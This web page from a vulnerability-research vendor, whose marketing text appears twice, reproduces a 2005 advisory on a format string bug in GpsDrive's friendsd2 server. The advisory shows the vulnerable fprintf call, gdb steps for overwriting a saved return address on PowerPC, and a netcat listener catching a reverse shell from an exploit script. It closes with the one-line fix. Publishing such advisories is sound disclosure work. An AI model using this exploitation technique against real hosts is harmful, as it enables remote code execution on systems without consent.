How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

DMA[2005-1104a] - 'GpsDrive friendsd2 format string vulnerability'
Author: Kevin Finisterre
Vendor: <http://www.gpsdrive.cc/>
Product: 'GpsDrive'
References: [http://www.digitalmunition.com/DMA[2005-1104a].txt](http://www.digitalmunition.com/DMA%5B2005-1104a%5D.txt)

Description:
GpsDrive is a car (bike, ship, plane) navigation system. It can display positioning information
provided from a NMEA capable GPS receiver on a zoomable map. Map file autoselecting is done based
on the current position and the prefered map scale. All Garmin GPS reveivers with a serial output
should be usable, as well as other GPS receivers that support NMEA protocol. GpsDrive was written
in C with use of the GTK+ graphic toolkit and it runs on Linux and FreeBSD. With minimal work it
is also posisble to run GpsDrive on Windows and on OSX.

GpsDrive comes with a server program called friendsd which acts as server for the position of your
friends. You see the position of your friends as a car symbol on the map, including the name, time,
day of week and the speed of his last connection. A blue arrow shows the last reported direction of
your friend. Fritz Ganter has blatantly stated in the man page that "The (friendsd) server was NOT
tested for security".

Please not that friendsd no longer runs as root since the last round of security patches.
kfinisterre:/home/kfinisterre# friendsd2
server: please don't run me as root

The friendsd server does contain an obvious format string issue complements of a bad fprintf() call.
./src/friendsd.c:367:     fprintf (stderr, txt);

Exploitation of this bug is fairly trivial, on powerpc I chose to overwrite a saved return address
as shown below.

First I just crashed the program and went to frame 2
0x0f67d1e0 in vfprintf () from /lib/tls/libc.so.6
(gdb) bt
#0  0x0f67d1e0 in vfprintf () from /lib/tls/libc.so.6
#1  0x0f67cc74 in vfprintf () from /lib/tls/libc.so.6
#2  0x0f6825d0 in fprintf () from /lib/tls/libc.so.6
#3  0x100024b8 in dg_echo ()
#4  0x10002f28 in main ()

Next I grab the address of Arglist for frame 2 and overwrite that +4
(gdb) i f
Stack level 2, frame at 0x7fffad70:
pc = 0xf6825d0 in fprintf; saved pc 0x100024b8
called by frame at 0x7fffae00, caller of frame at 0x7fff8700
Arglist at 0x7fffad70, args:
Locals at 0x7fffad70, Previous frame's sp in r1

(gdb) x/a 0x7fffad70+4
0x7fffad74:     0xf6825d0 <fprintf+112>  (overwrite this)

animosity:/home/kfinisterre$ nc -l -p 31337 -vvv
listening on [any] 31337 ...

animosity:/home/kfinisterre$ ./gpsdrive-ex-long-ppc.pl
$VAR1 = {};

192.168.1.1: inverse host lookup failed: Unknown host
connect to [192.168.1.1] from (UNKNOWN) [192.168.1.1] 3349

groups=20(dialout),24(cdrom),25(floppy),29(audio),44(video),46(plugdev),1000(kfinisterre)

Workaround:
Stop using friendsd2! or simply change the above mentioned fprintf() call to the following.
fprintf (stderr,"%s",txt);

Timeline associated with this bug:
I emailed Fritz Ganter (ganter () ganter at) at least twice about this and got no response.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.
